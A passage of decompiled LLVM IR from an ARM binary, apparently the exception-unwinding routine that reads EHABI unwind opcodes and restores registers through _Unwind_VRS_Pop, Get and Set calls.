  %v0_318c0 = load i32, i32* @r5, align 4
  %v1_318c0 = add i32 %v0_318c0, 8
  %v2_318c0 = inttoptr i32 %v1_318c0 to i8*
  %v3_318c0 = load i8, i8* %v2_318c0, align 1
  %v4_318c0 = zext i8 %v3_318c0 to i32
  store i32 %v4_318c0, i32* %r3.global-to-local, align 4
  %v2_318c4 = icmp eq i8 %v3_318c0, 0
  store i1 %v2_318c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_318c4, label %dec_label_pc_318d4, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_318c0
  %v2_318c8 = add nsw i32 %v4_318c0, -1
  store i32 %v2_318c8, i32* %r3.global-to-local, align 4
  %v2_318cc = trunc i32 %v2_318c8 to i8
  store i8 %v2_318cc, i8* %v2_318c0, align 1
  %v0_318d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_318d0.pr.pr, label %.thread3.dec_label_pc_318d4_crit_edge, label %dec_label_pc_31904

.thread3.dec_label_pc_318d4_crit_edge:            ; preds = %.thread3
  %v0_318d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_318d4

dec_label_pc_318d4:                               ; preds = %.thread3.dec_label_pc_318d4_crit_edge, %dec_label_pc_318c0
  %v2_318e8 = phi i32 [ %v0_318d4.pre, %.thread3.dec_label_pc_318d4_crit_edge ], [ %v0_318c0, %dec_label_pc_318c0 ]
  %v1_318d4 = add i32 %v2_318e8, 9
  %v2_318d4 = inttoptr i32 %v1_318d4 to i8*
  %v3_318d4 = load i8, i8* %v2_318d4, align 1
  %v4_318d4 = zext i8 %v3_318d4 to i32
  store i32 %v4_318d4, i32* %r3.global-to-local, align 4
  %v2_318d8 = icmp eq i8 %v3_318d4, 0
  store i1 %v2_318d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_318d8, label %dec_label_pc_31914, label %dec_label_pc_318e4

dec_label_pc_318e4:                               ; preds = %dec_label_pc_318d4
  %v1_318e4 = add nsw i32 %v4_318d4, -1
  store i32 %v1_318e4, i32* %r3.global-to-local, align 4
  %v1_318e8 = trunc i32 %v1_318e4 to i8
  store i8 %v1_318e8, i8* %v2_318d4, align 1
  %v0_318ec = load i32, i32* @r5, align 4
  %v1_318ec = add i32 %v0_318ec, 4
  %v2_318ec = inttoptr i32 %v1_318ec to i32*
  %v3_318ec = load i32, i32* %v2_318ec, align 4
  store i32 %v3_318ec, i32* %r2.global-to-local, align 4
  %v1_318f0 = inttoptr i32 %v3_318ec to i32*
  %v2_318f0 = load i32, i32* %v1_318f0, align 4
  store i32 %v2_318f0, i32* %r0.global-to-local, align 4
  %v4_318f0 = add i32 %v3_318ec, 4
  store i32 %v4_318f0, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_318f0, i32* %v2_318ec, align 4
  %v0_318fc = load i32, i32* %r3.global-to-local, align 4
  %v1_318fc = trunc i32 %v0_318fc to i8
  %v2_318fc = load i32, i32* @r5, align 4
  %v3_318fc = add i32 %v2_318fc, 8
  %v4_318fc = inttoptr i32 %v3_318fc to i8*
  store i8 %v1_318fc, i8* %v4_318fc, align 1
  %v0_31900 = load i32, i32* %r0.global-to-local, align 4
  %v1_31900 = load i32, i32* @r5, align 4
  %v2_31900 = inttoptr i32 %v1_31900 to i32*
  store i32 %v0_31900, i32* %v2_31900, align 4
  br label %dec_label_pc_31904

dec_label_pc_31904:                               ; preds = %.thread3, %dec_label_pc_318e4
  %v0_31904 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_31904, i32* %r3.global-to-local, align 4
  %v3_31908 = mul i32 %v0_31904, 256
  store i32 %v3_31908, i32* %r0.global-to-local, align 4
  %v1_3190c = load i32, i32* @r5, align 4
  %v2_3190c = inttoptr i32 %v1_3190c to i32*
  store i32 %v3_31908, i32* %v2_3190c, align 4
  %v0_31910 = load i32, i32* %r3.global-to-local, align 4
  %v3_31910 = udiv i32 %v0_31910, 16777216
  br label %dec_label_pc_31914

dec_label_pc_31914:                               ; preds = %dec_label_pc_318d4, %dec_label_pc_31904
  %storemerge133 = phi i32 [ %v3_31910, %dec_label_pc_31904 ], [ 176, %dec_label_pc_318d4 ]
  %v1_31914 = load i32, i32* %ip.global-to-local, align 4
  %v4_31914 = mul i32 %v1_31914, 256
  %v5_31914 = or i32 %v4_31914, %storemerge133
  store i32 %v5_31914, i32* %r2.global-to-local, align 4
  %v7_31918 = icmp eq i32 %v5_31914, 32768
  store i1 %v7_31918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31918, label %dec_label_pc_31b24, label %dec_label_pc_31920

dec_label_pc_31920:                               ; preds = %dec_label_pc_31914
  %v3_31920 = mul i32 %v5_31914, 16
  store i32 %v3_31920, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_31930 = and i32 %v3_31920, 65520
  store i32 %v3_31930, i32* %r2.global-to-local, align 4
  %v0_31934 = load i32, i32* @r7, align 4
  store i32 %v0_31934, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_3193c = call i32 @_Unwind_VRS_Pop(i32 %v0_31934, i32 %v3_31930, i32 0, i32 0)
  store i32 %v4_3193c, i32* %r0.global-to-local, align 4
  %v2_31940 = icmp eq i32 %v4_3193c, 0
  store i1 %v2_31940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31940, label %dec_label_pc_31948, label %dec_label_pc_31b24

dec_label_pc_31948:                               ; preds = %dec_label_pc_31920
  %v0_31948 = load i32, i32* @r5, align 4
  %v1_31948 = add i32 %v0_31948, 8
  %v2_31948 = inttoptr i32 %v1_31948 to i8*
  %v3_31948 = load i8, i8* %v2_31948, align 1
  %v4_31948 = zext i8 %v3_31948 to i32
  store i32 %v4_31948, i32* %r3.global-to-local, align 4
  %v0_3194c = load i32, i32* @r4, align 4
  %v1_3194c = and i32 %v0_3194c, 32768
  %v2_3194c = icmp eq i32 %v1_3194c, 0
  store i1 %v2_3194c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_3194c, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_31948
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_31948, %bb147
  %v2_31954 = icmp eq i8 %v3_31948, 0
  store i1 %v2_31954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31954, label %dec_label_pc_31964, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_31958 = add nsw i32 %v4_31948, -1
  store i32 %v2_31958, i32* %r3.global-to-local, align 4
  %v2_3195c = trunc i32 %v2_31958 to i8
  store i8 %v2_3195c, i8* %v2_31948, align 1
  %v0_31960.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31960.pr.pr, label %.thread6.dec_label_pc_31964_crit_edge, label %dec_label_pc_31890

.thread6.dec_label_pc_31964_crit_edge:            ; preds = %.thread6
  %v0_31964.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31964

dec_label_pc_31964:                               ; preds = %bb148, %.thread6.dec_label_pc_31964_crit_edge
  %v0_31964 = phi i32 [ %v0_31964.pre, %.thread6.dec_label_pc_31964_crit_edge ], [ %v0_31948, %bb148 ]
  %v1_31964 = add i32 %v0_31964, 9
  %v2_31964 = inttoptr i32 %v1_31964 to i8*
  %v3_31964 = load i8, i8* %v2_31964, align 1
  %v4_31964 = zext i8 %v3_31964 to i32
  store i32 %v4_31964, i32* %r3.global-to-local, align 4
  %v2_31968 = icmp eq i8 %v3_31964, 0
  store i1 %v2_31968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31968, label %dec_label_pc_31970, label %dec_label_pc_31874

dec_label_pc_31970:                               ; preds = %dec_label_pc_31964, %dec_label_pc_31868, %dec_label_pc_31890
  %v0_31970 = load i32, i32* @sl, align 4
  %v2_31970 = icmp eq i32 %v0_31970, 0
  store i1 %v2_31970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31970, label %dec_label_pc_31a38, label %bb149

bb149:                                            ; preds = %dec_label_pc_31970
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3197c

dec_label_pc_3197c:                               ; preds = %bb149, %dec_label_pc_31eec, %dec_label_pc_31d8c, %dec_label_pc_31bb0, %dec_label_pc_31b68, %dec_label_pc_31b24, %dec_label_pc_31a38
  %v1_31984 = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_31eec ], [ 9, %dec_label_pc_31d8c ], [ 9, %dec_label_pc_31bb0 ], [ 9, %dec_label_pc_31b68 ], [ 9, %dec_label_pc_31b24 ], [ %v0_31a6c, %dec_label_pc_31a38 ]
  store i32 %v9_31840, i32* %r6.global-to-local, align 4
  store i32 %v21_31840, i32* @lr, align 4
  ret i32 %v1_31984

dec_label_pc_31988:                               ; preds = %dec_label_pc_318ac
  %v1_31988 = mul i32 %v0_318ac, 4
  %v3_3198c = and i32 %v1_31988, 252
  store i32 %v3_3198c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_31998 = load i32, i32* @r7, align 4
  store i32 %v0_31998, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_319a0 = add nuw nsw i32 %v3_3198c, 4
  store i32 %v1_319a0, i32* %r6.global-to-local, align 4
  %v5_319a8 = call i32 @_Unwind_VRS_Get(i32 %v0_31998, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_319ac = load i32, i32* @r4, align 4
  %v1_319ac = and i32 %v0_319ac, 64
  %v2_319ac = icmp eq i32 %v1_319ac, 0
  store i1 %v2_319ac, i1* %cpsr_z.global-to-local, align 1
  %v4_319b4 = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_319c0 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_319c0
  %storemerge160.p = select i1 %v2_319ac, i32 %v2_319c0, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_319b4
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_319dc = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_319dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31854.backedge

dec_label_pc_31854.backedge:                      ; preds = %dec_label_pc_31988, %dec_label_pc_31a04, %dec_label_pc_31e88, %dec_label_pc_31b54, %dec_label_pc_31b8c, %dec_label_pc_31b0c, %dec_label_pc_31d78
  %v0_31854.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31854

dec_label_pc_319e4:                               ; preds = %dec_label_pc_318b4
  %v7_319e4 = icmp eq i32 %v1_318b4, 144
  store i1 %v7_319e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_319e4, label %dec_label_pc_319ec, label %dec_label_pc_31b2c

dec_label_pc_319ec:                               ; preds = %dec_label_pc_319e4
  %v1_319ec = urem i32 %v0_318ac, 16
  store i32 %v1_319ec, i32* %r2.global-to-local, align 4
  %v2_319f0 = icmp eq i32 %v1_319ec, 15
  store i1 %v2_319f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_319f0, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_319ec
  %v8_319f4 = icmp eq i32 %v1_319ec, 13
  store i1 %v8_319f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_319f4, label %bb154, label %dec_label_pc_31a04

.thread21:                                        ; preds = %dec_label_pc_319ec
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_31b24

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_31b24

dec_label_pc_31a04:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_31a10 = load i32, i32* @r7, align 4
  store i32 %v0_31a10, i32* %r0.global-to-local, align 4
  %v5_31a18 = call i32 @_Unwind_VRS_Get(i32 %v0_31a10, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_31a20 = load i32, i32* @r7, align 4
  store i32 %v0_31a20, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_31a30 = call i32 @_Unwind_VRS_Set(i32 %v0_31a20, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_31a30, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_31854.backedge

dec_label_pc_31a38:                               ; preds = %dec_label_pc_31970
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_31a48 = load i32, i32* @r7, align 4
  store i32 %v0_31a48, i32* %r0.global-to-local, align 4
  %v7_31a50 = call i32 @_Unwind_VRS_Get(i32 %v0_31a48, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_31a54 = load i32, i32* @r7, align 4
  store i32 %v0_31a54, i32* %r0.global-to-local, align 4
  %v0_31a58 = load i32, i32* @sl, align 4
  store i32 %v0_31a58, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_31a58, i32* %r3.global-to-local, align 4
  %v5_31a68 = call i32 @_Unwind_VRS_Set(i32 %v0_31a54, i32 %v0_31a58, i32 15, i32 %v0_31a58, i8* bitcast (i32* @0 to i8*))
  %v0_31a6c = load i32, i32* @sl, align 4
  store i32 %v0_31a6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3197c

dec_label_pc_31a74:                               ; preds = %dec_label_pc_31c68
  %v7_31a74 = icmp eq i32 %v0_31c68, 199
  store i1 %v7_31a74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31a74, label %dec_label_pc_31d48, label %dec_label_pc_31a7c

dec_label_pc_31a7c:                               ; preds = %dec_label_pc_31a74
  %v1_31a7c = and i32 %v0_318ac, 248
  store i32 %v1_31a7c, i32* %r3.global-to-local, align 4
  %v7_31a80 = icmp eq i32 %v1_31a7c, 192
  store i1 %v7_31a80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31a80, label %.thread24, label %dec_label_pc_31a98

.thread24:                                        ; preds = %dec_label_pc_31a7c
  %v2_31a84 = urem i32 %v0_318ac, 16
  %v2_31a88 = add nuw nsw i32 %v2_31a84, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_31a90 = or i32 %v2_31a88, 655360
  store i32 %v2_31a90, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_31b54

dec_label_pc_31a98:                               ; preds = %dec_label_pc_31a7c
  %v7_31a98 = icmp eq i32 %v0_31c68, 200
  store i1 %v7_31a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31a98, label %dec_label_pc_31cdc, label %dec_label_pc_31aa0

dec_label_pc_31aa0:                               ; preds = %dec_label_pc_31a98
  %v7_31aa0 = icmp eq i32 %v0_31c68, 201
  store i1 %v7_31aa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31aa0, label %dec_label_pc_31aa8, label %dec_label_pc_31b24

dec_label_pc_31aa8:                               ; preds = %dec_label_pc_31aa0
  %v0_31aa8 = load i32, i32* @r5, align 4
  %v1_31aa8 = add i32 %v0_31aa8, 8
  %v2_31aa8 = inttoptr i32 %v1_31aa8 to i8*
  %v3_31aa8 = load i8, i8* %v2_31aa8, align 1
  %v4_31aa8 = zext i8 %v3_31aa8 to i32
  store i32 %v4_31aa8, i32* %r3.global-to-local, align 4
  %v2_31aac = icmp eq i8 %v3_31aa8, 0
  store i1 %v2_31aac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31aac, label %dec_label_pc_31abc, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_31aa8
  %v2_31ab0 = add nsw i32 %v4_31aa8, -1
  store i32 %v2_31ab0, i32* %r3.global-to-local, align 4
  %v2_31ab4 = trunc i32 %v2_31ab0 to i8
  store i8 %v2_31ab4, i8* %v2_31aa8, align 1
  %v0_31ab8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31ab8.pr.pr, label %.thread26.dec_label_pc_31abc_crit_edge, label %dec_label_pc_31af0

.thread26.dec_label_pc_31abc_crit_edge:           ; preds = %.thread26
  %v0_31abc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31abc

dec_label_pc_31abc:                               ; preds = %.thread26.dec_label_pc_31abc_crit_edge, %dec_label_pc_31aa8
  %v2_31ad4 = phi i32 [ %v0_31abc.pre, %.thread26.dec_label_pc_31abc_crit_edge ], [ %v0_31aa8, %dec_label_pc_31aa8 ]
  %v1_31abc = add i32 %v2_31ad4, 9
  %v2_31abc = inttoptr i32 %v1_31abc to i8*
  %v3_31abc = load i8, i8* %v2_31abc, align 1
  %v4_31abc = zext i8 %v3_31abc to i32
  store i32 %v4_31abc, i32* %r3.global-to-local, align 4
  %v2_31ac0 = icmp eq i8 %v3_31abc, 0
  store i1 %v2_31ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31ac0, label %dec_label_pc_31b0c, label %dec_label_pc_31ad0

dec_label_pc_31ad0:                               ; preds = %dec_label_pc_31abc
  %v1_31ad0 = add nsw i32 %v4_31abc, -1
  store i32 %v1_31ad0, i32* %r3.global-to-local, align 4
  %v1_31ad4 = trunc i32 %v1_31ad0 to i8
  store i8 %v1_31ad4, i8* %v2_31abc, align 1
  %v0_31ad8 = load i32, i32* @r5, align 4
  %v1_31ad8 = add i32 %v0_31ad8, 4
  %v2_31ad8 = inttoptr i32 %v1_31ad8 to i32*
  %v3_31ad8 = load i32, i32* %v2_31ad8, align 4
  store i32 %v3_31ad8, i32* %r2.global-to-local, align 4
  %v1_31adc = inttoptr i32 %v3_31ad8 to i32*
  %v2_31adc = load i32, i32* %v1_31adc, align 4
  store i32 %v2_31adc, i32* %r0.global-to-local, align 4
  %v4_31adc = add i32 %v3_31ad8, 4
  store i32 %v4_31adc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_31adc, i32* %v2_31ad8, align 4
  %v0_31ae8 = load i32, i32* %r3.global-to-local, align 4
  %v1_31ae8 = trunc i32 %v0_31ae8 to i8
  %v2_31ae8 = load i32, i32* @r5, align 4
  %v3_31ae8 = add i32 %v2_31ae8, 8
  %v4_31ae8 = inttoptr i32 %v3_31ae8 to i8*
  store i8 %v1_31ae8, i8* %v4_31ae8, align 1
  %v0_31aec = load i32, i32* %r0.global-to-local, align 4
  %v1_31aec = load i32, i32* @r5, align 4
  %v2_31aec = inttoptr i32 %v1_31aec to i32*
  store i32 %v0_31aec, i32* %v2_31aec, align 4
  br label %dec_label_pc_31af0

dec_label_pc_31af0:                               ; preds = %.thread26, %dec_label_pc_31ad0
  %v0_31af0 = load i32, i32* %r0.global-to-local, align 4
  %v3_31af0 = udiv i32 %v0_31af0, 16777216
  %v1_31af4 = urem i32 %v3_31af0, 16
  %v3_31af8 = mul i32 %v0_31af0, 256
  %v1_31afc = add nuw nsw i32 %v1_31af4, 1
  store i32 %v1_31afc, i32* %r1.global-to-local, align 4
  %v1_31b00 = and i32 %v3_31af0, 240
  store i32 %v1_31b00, i32* %r3.global-to-local, align 4
  %v1_31b04 = load i32, i32* @r5, align 4
  %v2_31b04 = inttoptr i32 %v1_31b04 to i32*
  store i32 %v3_31af8, i32* %v2_31b04, align 4
  %v0_31b08 = load i32, i32* %r1.global-to-local, align 4
  %v1_31b08 = load i32, i32* %r3.global-to-local, align 4
  %v4_31b08 = mul i32 %v1_31b08, 4096
  %v5_31b08 = or i32 %v4_31b08, %v0_31b08
  br label %dec_label_pc_31b0c

dec_label_pc_31b0c:                               ; preds = %dec_label_pc_31abc, %dec_label_pc_31af0
  %storemerge = phi i32 [ %v5_31b08, %dec_label_pc_31af0 ], [ 720897, %dec_label_pc_31abc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_31b0c = load i32, i32* @r7, align 4
  store i32 %v0_31b0c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_31b18 = call i32 @_Unwind_VRS_Pop(i32 %v0_31b0c, i32 1, i32 5, i32 5)
  store i32 %v4_31b18, i32* %r0.global-to-local, align 4
  %v2_31b1c = icmp eq i32 %v4_31b18, 0
  store i1 %v2_31b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31b1c, label %dec_label_pc_31854.backedge, label %dec_label_pc_31b24

dec_label_pc_31b24:                               ; preds = %dec_label_pc_31d70, %dec_label_pc_31aa0, %dec_label_pc_31b80, %dec_label_pc_31f24, %dec_label_pc_31ef4, %dec_label_pc_31ed0, %dec_label_pc_31d5c, %dec_label_pc_31b0c, %dec_label_pc_31920, %dec_label_pc_31914, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3197c

dec_label_pc_31b2c:                               ; preds = %dec_label_pc_319e4
  %v7_31b2c = icmp eq i32 %v1_318b4, 160
  store i1 %v7_31b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31b2c, label %dec_label_pc_31b34, label %dec_label_pc_31b70

dec_label_pc_31b34:                               ; preds = %dec_label_pc_31b2c
  %v0_31b34 = load i32, i32* %ip.global-to-local, align 4
  %v1_31b34 = urem i32 %v0_31b34, 8
  %v1_31b38 = xor i32 %v1_31b34, 7
  store i32 %v1_31b38, i32* %r3.global-to-local, align 4
  %v6_31b40 = lshr i32 4080, %v1_31b38
  %v1_31b44 = and i32 %v0_318ac, 8
  %v2_31b44 = icmp eq i32 %v1_31b44, 0
  store i1 %v2_31b44, i1* %cpsr_z.global-to-local, align 1
  %v1_31b48 = and i32 %v6_31b40, 4080
  %tmp155 = mul nuw nsw i32 %v1_31b44, 2048
  %tmp156 = or i32 %v1_31b48, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_31b54

dec_label_pc_31b54:                               ; preds = %.thread44, %.thread24, %dec_label_pc_31ee4.dec_label_pc_31b54_crit_edge, %bb157, %dec_label_pc_31d40, %dec_label_pc_31cd4, %dec_label_pc_31c34, %dec_label_pc_31b34
  %v2_31b5c = phi i32 [ %v2_31c58, %.thread44 ], [ %v2_31c60, %bb157 ], [ %v2_31b5c.pre, %dec_label_pc_31ee4.dec_label_pc_31b54_crit_edge ], [ %v2_31a90, %.thread24 ], [ %storemerge130, %dec_label_pc_31d40 ], [ %storemerge131, %dec_label_pc_31cd4 ], [ %storemerge132, %dec_label_pc_31c34 ], [ %tmp156, %dec_label_pc_31b34 ]
  %v0_31b58 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_31ee4.dec_label_pc_31b54_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_31d40 ], [ 3, %dec_label_pc_31cd4 ], [ 1, %dec_label_pc_31c34 ], [ 0, %dec_label_pc_31b34 ]
  %v0_31b54 = load i32, i32* @r7, align 4
  store i32 %v0_31b54, i32* %r0.global-to-local, align 4
  store i32 %v0_31b58, i32* %r3.global-to-local, align 4
  %v4_31b5c = call i32 @_Unwind_VRS_Pop(i32 %v0_31b54, i32 %v0_31b58, i32 %v2_31b5c, i32 %v0_31b58)
  store i32 %v4_31b5c, i32* %r0.global-to-local, align 4
  %v2_31b60 = icmp eq i32 %v4_31b5c, 0
  store i1 %v2_31b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31b60, label %dec_label_pc_31854.backedge, label %dec_label_pc_31b68

dec_label_pc_31b68:                               ; preds = %dec_label_pc_31b54
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3197c

dec_label_pc_31b70:                               ; preds = %dec_label_pc_31b2c
  %v7_31b70 = icmp eq i32 %v1_318b4, 176
  store i1 %v7_31b70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31b70, label %dec_label_pc_31bb8, label %dec_label_pc_31b78

dec_label_pc_31b78:                               ; preds = %dec_label_pc_31b70
  %v7_31b78 = icmp eq i32 %v1_318b4, 192
  store i1 %v7_31b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31b78, label %dec_label_pc_31c68, label %dec_label_pc_31b80

dec_label_pc_31b80:                               ; preds = %dec_label_pc_31b78
  %v1_31b80 = and i32 %v0_318ac, 248
  store i32 %v1_31b80, i32* %r3.global-to-local, align 4
  %v7_31b84 = icmp eq i32 %v1_31b80, 208
  store i1 %v7_31b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31b84, label %dec_label_pc_31b8c, label %dec_label_pc_31b24

dec_label_pc_31b8c:                               ; preds = %dec_label_pc_31b80
  %v1_31b8c = urem i32 %v0_318ac, 8
  %v1_31b90 = add nuw nsw i32 %v1_31b8c, 1
  %v1_31b94 = or i32 %v1_31b90, 524288
  store i32 %v1_31b94, i32* %r2.global-to-local, align 4
  %v0_31b98 = load i32, i32* @r7, align 4
  store i32 %v0_31b98, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_31ba4 = call i32 @_Unwind_VRS_Pop(i32 %v0_31b98, i32 1, i32 %v1_31b94, i32 5)
  store i32 %v4_31ba4, i32* %r0.global-to-local, align 4
  %v2_31ba8 = icmp eq i32 %v4_31ba4, 0
  store i1 %v2_31ba8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31ba8, label %dec_label_pc_31854.backedge, label %dec_label_pc_31bb0

dec_label_pc_31bb0:                               ; preds = %dec_label_pc_31b8c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_3197c

dec_label_pc_31bb8:                               ; preds = %dec_label_pc_31b70
  %v0_31bb8 = load i32, i32* %ip.global-to-local, align 4
  %v7_31bb8 = icmp eq i32 %v0_31bb8, 177
  store i1 %v7_31bb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31bb8, label %dec_label_pc_31ebc, label %dec_label_pc_31bc0

dec_label_pc_31bc0:                               ; preds = %dec_label_pc_31bb8
  %v7_31bc0 = icmp eq i32 %v0_31bb8, 178
  store i1 %v7_31bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31bc0, label %dec_label_pc_31d94, label %dec_label_pc_31bc8

dec_label_pc_31bc8:                               ; preds = %dec_label_pc_31bc0
  %v7_31bc8 = icmp eq i32 %v0_31bb8, 179
  store i1 %v7_31bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_31bc8, label %dec_label_pc_31bd0, label %dec_label_pc_31c3c

dec_label_pc_31bd0:                               ; preds = %dec_label_pc_31bc8
  %v0_31bd0 = load i32, i32* @r5, align 4
  %v1_31bd0 = add i32 %v0_31bd0, 8
  %v2_31bd0 = inttoptr i32 %v1_31bd0 to i8*
  %v3_31bd0 = load i8, i8* %v2_31bd0, align 1
  %v4_31bd0 = zext i8 %v3_31bd0 to i32
  store i32 %v4_31bd0, i32* %r3.global-to-local, align 4
  %v2_31bd4 = icmp eq i8 %v3_31bd0, 0
  store i1 %v2_31bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31bd4, label %dec_label_pc_31be4, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_31bd0
  %v2_31bd8 = add nsw i32 %v4_31bd0, -1
  store i32 %v2_31bd8, i32* %r3.global-to-local, align 4
  %v2_31bdc = trunc i32 %v2_31bd8 to i8
  store i8 %v2_31bdc, i8* %v2_31bd0, align 1
  %v0_31be0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_31be0.pr.pr, label %.thread30.dec_label_pc_31be4_crit_edge, label %dec_label_pc_31c18

.thread30.dec_label_pc_31be4_crit_edge:           ; preds = %.thread30
  %v0_31be4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_31be4

dec_label_pc_31be4:                               ; preds = %.thread30.dec_label_pc_31be4_crit_edge, %dec_label_pc_31bd0
  %v2_31bfc = phi i32 [ %v0_31be4.pre, %.thread30.dec_label_pc_31be4_crit_edge ], [ %v0_31bd0, %dec_label_pc_31bd0 ]
  %v1_31be4 = add i32 %v2_31bfc, 9
  %v2_31be4 = inttoptr i32 %v1_31be4 to i8*
  %v3_31be4 = load i8, i8* %v2_31be4, align 1
  %v4_31be4 = zext i8 %v3_31be4 to i32
  store i32 %v4_31be4, i32* %r3.global-to-local, align 4
  %v2_31be8 = icmp eq i8 %v3_31be4, 0
  store i1 %v2_31be8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_31be8, label %dec_label_pc_31c34, label %dec_label_pc_31bf8

dec_label_pc_31bf8:                               ; preds = %dec_label_pc_31be4
  %v1_31bf8 = add nsw i32 %v4_31be4, -1
  store i32 %v1_31bf8, i32* %r3.global-to-local, align 4
  %v1_31bfc = trunc i32 %v1_31bf8 to i8
  store i8 %v1_31bfc, i8* %v2_31be4, align 1
  %v0_31c00 = load i32, i32* @r5, align 4
  %v1_31c00 = add i32 %v0_31c00, 4
  %v2_31c00 = inttoptr i32 %v1_31c00 to i32*
  %v3_31c00 = load i32, i32* %v2_31c00, align 4
